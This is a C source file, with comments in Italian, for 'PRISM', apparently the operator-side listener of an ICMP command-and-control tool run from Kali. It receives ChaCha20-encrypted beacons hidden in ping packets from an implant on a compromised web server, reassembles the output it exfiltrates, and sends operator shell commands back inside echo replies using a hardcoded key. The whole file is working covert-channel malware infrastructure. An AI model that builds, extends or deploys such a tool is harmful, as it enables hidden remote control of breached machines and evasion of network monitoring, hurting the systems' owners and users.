/*
 * prism_client.c — ICMP C2 listener (gira su Kali)
 *
 * Modalità reverse beacon:
 *   - Attende beacon ICMP ECHO REQUEST dall'implant (WebServer)
 *   - Accumula fragment e mostra output completo a reassembly terminato
 *   - Legge comando dall'operatore e lo invia nell'ECHO REPLY
 *   - Durante frammentazione: risponde NOP automaticamente
 *
 * Compilazione: gcc -O2 -o prism_client prism_client.c
 * Uso:          sudo ./prism_client
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>

#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <arpa/inet.h>

#include "chacha20.h"

#define MAGIC_BEACON     0xDEADBEEFu
#define MAGIC_CMD        0xCAFEBABEu

#define MAGIC_OFFSET     8
#define NONCE_OFFSET     12
#define ENCLEN_OFFSET    24
#define DATA_OFFSET      26

#define TOTAL_PAYLOAD    512
#define FRAG_HDR_SIZE    2
#define MAX_FRAG_DATA    (TOTAL_PAYLOAD - DATA_OFFSET - FRAG_HDR_SIZE)  /* 484 */

#define MAX_CMD          512
#define MAX_OUT          8192
#define BUF_SIZE         8192

static const uint8_t SHARED_KEY[32] = {
    0x3a, 0x7f, 0x21, 0x9c, 0x4b, 0xe8, 0x05, 0x63,
    0xd1, 0x88, 0xf4, 0x2e, 0x90, 0xa5, 0x6c, 0x11,
    0x7d, 0x3b, 0xc9, 0x54, 0xe2, 0x08, 0x76, 0xfa,
    0x1f, 0x4d, 0x82, 0x37, 0xb6, 0x5e, 0x0a, 0x99
};

/* ── Stato reassembly fragment ── */
static uint8_t reassembly_buf[MAX_OUT + 1];
static size_t  reassembly_len   = 0;
static int     reassembly_total = 0;   /* total fragments attesi */
static int     reassembly_got   = 0;   /* fragments ricevuti finora */

static uint16_t icmp_checksum(const uint8_t *buf, size_t len)
{
    uint32_t sum = 0;
    const uint16_t *p = (const uint16_t *)buf;
    while (len > 1) { sum += *p++; len -= 2; }
    if (len) sum += *(const uint8_t *)p;
    sum  = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (uint16_t)(~sum);
}

static size_t build_reply_payload(uint8_t *out, size_t out_max,
                                   uint32_t magic,
                                   const uint8_t *data, size_t data_len)
{
    uint8_t nonce[12];
    get_random_nonce(nonce, sizeof(nonce));

    uint8_t enc[MAX_CMD];
    if (data_len > sizeof(enc)) data_len = sizeof(enc);
    chacha20_encrypt(enc, data, data_len, SHARED_KEY, nonce, 0);

    size_t total = DATA_OFFSET + data_len;
    if (total > out_max) return 0;

    /* [0-7]: pattern identico al beacon (timestamp bytes — rispecchia il request) */
    memset(out, 0, MAGIC_OFFSET);

    uint32_t magic_net = htonl(magic);
    memcpy(out + MAGIC_OFFSET, &magic_net, 4);
    memcpy(out + NONCE_OFFSET, nonce, 12);
    out[ENCLEN_OFFSET]     = (uint8_t)(data_len & 0xff);
    out[ENCLEN_OFFSET + 1] = (uint8_t)((data_len >> 8) & 0xff);
    memcpy(out + DATA_OFFSET, enc, data_len);

    /* Padding casuale per raggiungere TOTAL_PAYLOAD */
    if (total < TOTAL_PAYLOAD) {
        get_random_nonce(out + total, TOTAL_PAYLOAD - total);
        total = TOTAL_PAYLOAD;
    }

    return total;
}

int main(void)
{
    signal(SIGPIPE, SIG_IGN);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("socket");
        fprintf(stderr, "Hint: eseguire come root (sudo)\n");
        return 1;
    }

    printf("╔══════════════════════════════════════════════╗\n");
    printf("║  PRISM ICMP C2  — reverse beacon mode        ║\n");
    printf("║  In attesa di beacon dall'implant...         ║\n");
    printf("║  Cifratura: ChaCha20 (RFC 7539)              ║\n");
    printf("║  Payload: 512 byte, fragment: 484 byte/each  ║\n");
    printf("║  Ctrl+C per uscire                           ║\n");
    printf("╚══════════════════════════════════════════════╝\n\n");

    uint8_t buf[BUF_SIZE];
    char    cmd_input[MAX_CMD];

    for (;;) {
        struct sockaddr_in src_addr;
        socklen_t src_len = sizeof(src_addr);

        ssize_t n = recvfrom(sock, buf, sizeof(buf), 0,
                             (struct sockaddr *)&src_addr, &src_len);
        if (n < 0) {
            if (errno == EINTR) continue;
            continue;
        }

        if (n < 1) continue;
        int ip_hlen = (buf[0] & 0x0f) * 4;
        if (n < ip_hlen + (int)sizeof(struct icmphdr)) continue;

        struct icmphdr *icmp_in = (struct icmphdr *)(buf + ip_hlen);
        if (icmp_in->type != ICMP_ECHO || icmp_in->code != 0) continue;

        uint8_t *payload     = buf + ip_hlen + sizeof(struct icmphdr);
        ssize_t  payload_len = n - ip_hlen - (ssize_t)sizeof(struct icmphdr);

        if (payload_len < DATA_OFFSET + 1) continue;

        uint32_t magic_rcv;
        memcpy(&magic_rcv, payload + MAGIC_OFFSET, 4);
        if (ntohl(magic_rcv) != MAGIC_BEACON) continue;

        /* Decripta payload */
        uint8_t bnonce[12];
        memcpy(bnonce, payload + NONCE_OFFSET, 12);

        uint16_t enc_len = (uint16_t)payload[ENCLEN_OFFSET]
                         | ((uint16_t)payload[ENCLEN_OFFSET + 1] << 8);

        char implant_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &src_addr.sin_addr, implant_ip, sizeof(implant_ip));

        int fragmentation_done = 0;   /* 1 = output completo pronto */

        if (enc_len >= FRAG_HDR_SIZE && DATA_OFFSET + enc_len <= (size_t)payload_len
            && enc_len < MAX_OUT) {

            uint8_t dec_buf[MAX_OUT + 1];
            chacha20_encrypt(dec_buf, payload + DATA_OFFSET, enc_len,
                             SHARED_KEY, bnonce, 0);

            uint8_t frag_num   = dec_buf[0];
            uint8_t frag_total = dec_buf[1];
            uint8_t *frag_data = dec_buf + FRAG_HDR_SIZE;
            size_t   frag_dlen = enc_len - FRAG_HDR_SIZE;

            /* Sanity check: implant v1 senza header fragment
             * (es. frag_num=79/'O' > frag_total=75/'K' per "OK")
             * → scarta silenziosamente, risponde NOP */
            if (frag_num == 0 || frag_total == 0 || frag_num > frag_total)
                continue;

            /* Fragment 1: inizia nuovo reassembly */
            if (frag_num == 1) {
                reassembly_len   = 0;
                reassembly_total = frag_total;
                reassembly_got   = 0;
            }

            /* Accumula dati */
            if (reassembly_len + frag_dlen < MAX_OUT) {
                memcpy(reassembly_buf + reassembly_len, frag_data, frag_dlen);
                reassembly_len += frag_dlen;
                reassembly_got++;
            }

            /* Ultimo fragment: output completo */
            if (frag_num == frag_total) {
                reassembly_buf[reassembly_len] = '\0';
                fragmentation_done = 1;

                /* Messaggi silenziosi: non stampare PRISM_INIT e OK */
                if (strcmp((char *)reassembly_buf, "PRISM_INIT") != 0 &&
                    strcmp((char *)reassembly_buf, "OK") != 0) {

                    if (frag_total > 1)
                        printf("\n[output da %s — %d fragment(i)]\n%s",
                               implant_ip, frag_total, (char *)reassembly_buf);
                    else
                        printf("\n[output da %s]\n%s",
                               implant_ip, (char *)reassembly_buf);
                }
            } else {
                /* Fragment intermedio: stampa indicatore e manda NOP */
                printf("  [frag %d/%d da %s...]\n",
                       frag_num, frag_total, implant_ip);
                fflush(stdout);
            }
        }

        /* Determina cosa rispondere */
        const char *to_send;

        if (!fragmentation_done) {
            /* Fragment intermedio: NOP automatico, non chiedere comando */
            to_send = "NOP";
        } else {
            /* Output completo ricevuto: leggi comando dall'operatore */
            printf("\nprism@%s> ", implant_ip);
            fflush(stdout);

            struct timeval tv = { .tv_sec = 4, .tv_usec = 0 };
            fd_set fds;
            FD_ZERO(&fds);
            FD_SET(STDIN_FILENO, &fds);

            if (select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv) > 0
                && fgets(cmd_input, sizeof(cmd_input), stdin)) {
                size_t len = strlen(cmd_input);
                if (len > 0 && cmd_input[len-1] == '\n') cmd_input[--len] = '\0';
                to_send = (len > 0) ? cmd_input : "NOP";
            } else {
                to_send = "NOP";
            }
        }

        /* Costruisci ECHO REPLY con comando (o NOP) */
        uint8_t reply_buf[sizeof(struct icmphdr) + TOTAL_PAYLOAD + MAX_CMD];
        size_t rdata_len = build_reply_payload(
            reply_buf + sizeof(struct icmphdr),
            sizeof(reply_buf) - sizeof(struct icmphdr),
            MAGIC_CMD,
            (const uint8_t *)to_send, strlen(to_send)
        );
        if (rdata_len == 0) continue;

        size_t reply_pkt_len = sizeof(struct icmphdr) + rdata_len;

        struct icmphdr *icmp_out = (struct icmphdr *)reply_buf;
        memset(icmp_out, 0, sizeof(struct icmphdr));
        icmp_out->type             = ICMP_ECHOREPLY;
        icmp_out->code             = 0;
        icmp_out->un.echo.id       = icmp_in->un.echo.id;
        icmp_out->un.echo.sequence = icmp_in->un.echo.sequence;
        icmp_out->checksum         = icmp_checksum(reply_buf, reply_pkt_len);

        sendto(sock, reply_buf, reply_pkt_len, 0,
               (struct sockaddr *)&src_addr, src_len);
    }

    close(sock);
    return 0;
}
